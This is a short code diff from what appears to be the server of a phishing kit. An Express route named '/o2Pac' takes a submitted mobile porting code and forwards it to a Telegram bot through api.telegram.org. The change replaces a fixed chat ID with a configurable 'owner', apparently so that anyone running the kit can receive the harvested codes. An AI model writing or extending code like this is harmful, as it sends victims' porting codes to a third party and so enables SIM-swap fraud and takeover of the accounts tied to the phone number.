@@ -329,7 +329,7 @@ app.post("/o2Pac", (req, res) => {
     .post(
       `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
       {
-        chat_id: "1190384225",
+        chat_id: owner,
         text: `O2 PAC:\n${originalText}`,
         parse_mode: "Markdown",
       }
